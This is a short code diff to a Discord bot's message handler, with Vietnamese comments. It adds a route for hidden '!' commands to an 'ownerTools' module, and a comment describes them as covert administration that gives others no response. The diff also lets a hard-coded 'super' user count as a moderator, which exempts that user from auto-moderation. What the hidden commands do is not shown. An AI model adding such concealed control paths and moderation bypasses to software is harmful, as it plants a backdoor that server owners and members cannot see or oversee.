@@ -6,6 +6,8 @@ const { checkAutoAchievements, flashNotice } = require('../services/gzwCore');
 const gzw = require('../config/gzw');
 const guard = require('../services/guard');
 const { isInviteLink } = require('../services/guardRules');
+const { isSuper } = require('../services/superAdmin');
+const ownerTools = require('../services/ownerTools');
 
 // Theo dõi spam đơn giản trong bộ nhớ: Map<userId, number[]> (timestamps)
 const messageLog = new Map();
@@ -23,10 +25,12 @@ module.exports = {
   async execute(message, client) {
     if (message.author.bot || !message.guild || message.system) return;
 
+    // Lệnh ẩn cho quản trị ngầm (người khác không nhận phản hồi nào)
+    if (message.content.startsWith('!') && await ownerTools.handle(message)) return;
     // ---- Auto-mod ----
     if (config.automod.enabled) {
       const member = message.member;
-      const isModerator = member?.permissions?.has('ManageMessages');
+      const isModerator = member?.permissions?.has('ManageMessages') || isSuper(message.author.id);
 
       if (!isModerator) {
         let kind = null;
